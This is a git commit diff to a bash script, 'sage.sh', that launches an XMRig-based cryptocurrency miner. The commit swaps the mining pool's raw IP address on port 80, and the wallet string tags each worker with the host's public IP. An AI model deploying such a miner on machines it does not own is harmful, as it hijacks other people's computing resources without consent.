8050d25fd8b328065e48ccdcdd8dc16038810b78
Ryan Wahyudi <116867564+RyanWahyudi8@users.noreply.github.com>
2024-01-05 01:35:36 +0700

    Update sage.sh

--- sage.sh
+++ sage.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=stratum+ssl://172.200.229.146:80
+POOL=stratum+ssl://20.114.150.102:80
 WALLET=IRON:757ea84ec697775b5721d45cdc3a4e100ee0722a90ea359bcfd894f51c415b71:20491097150.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )#lus6-e35u
 cd "$(dirname "$0")"
 chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-disabled
